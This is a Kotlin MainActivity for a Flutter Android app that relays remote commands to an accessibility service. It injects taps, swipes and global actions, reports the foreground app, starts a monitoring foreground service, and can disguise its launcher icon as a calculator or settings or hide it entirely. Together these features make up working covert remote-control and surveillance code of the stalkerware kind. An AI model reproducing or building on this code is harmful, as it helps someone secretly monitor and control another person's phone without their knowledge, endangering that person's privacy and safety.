package com.master.master_and_client

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {
    private val CHANNEL = "com.master/remote"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "performTap" -> {
                    val x = call.argument<Double>("x")?.toFloat() ?: 0f
                    val y = call.argument<Double>("y")?.toFloat() ?: 0f
                    MyAccessibilityService.instance?.performRemoteTap(x, y)
                    result.success(null)
                }
                "performSwipe" -> {
                    val sx = call.argument<Double>("startX")?.toFloat() ?: 0f
                    val sy = call.argument<Double>("startY")?.toFloat() ?: 0f
                    val ex = call.argument<Double>("endX")?.toFloat() ?: 0f
                    val ey = call.argument<Double>("endY")?.toFloat() ?: 0f
                    MyAccessibilityService.instance?.performRemoteSwipe(sx, sy, ex, ey)
                    result.success(null)
                }
                "globalAction" -> {
                    val action = call.argument<String>("action") ?: "home"
                    MyAccessibilityService.instance?.performGlobalAction(action)
                    result.success(true)
                }
                "screenSize" -> {
                    val dm = resources.displayMetrics
                    result.success(mapOf("w" to dm.widthPixels, "h" to dm.heightPixels))
                }
                "getCurrentApp" -> result.success(MyAccessibilityService.currentApp)
                "startForegroundService" -> {
                    val intent = Intent(this, MonitoringForegroundService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
                    else startService(intent)
                    result.success(null)
                }
                "stopForegroundService" -> {
                    stopService(Intent(this, MonitoringForegroundService::class.java))
                    result.success(null)
                }
                "setIconMode" -> {
                    val mode = call.argument<String>("mode") ?: "default"
                    applyIconMode(mode)
                    result.success(true)
                }
                "openAccessibilitySettings" -> {
                    val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                    result.success(true)
                }
                "isAccessibilityEnabled" -> result.success(MyAccessibilityService.instance != null)
                else -> result.notImplemented()
            }
        }
    }

    private fun applyIconMode(mode: String) {
        val pm = applicationContext.packageManager
        val pkg = applicationContext.packageName
        val aliases = mapOf(
            "default"  to "$pkg.AliasDefault",
            "calc"     to "$pkg.AliasCalculator",
            "settings" to "$pkg.AliasSettings",
            "hidden"   to "$pkg.AliasHidden"
        )
        val target = aliases[mode] ?: return
        aliases.values.forEach { name ->
            val state = if (name == target)
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            pm.setComponentEnabledSetting(ComponentName(pkg, name), state, PackageManager.DONT_KILL_APP)
        }
    }
}
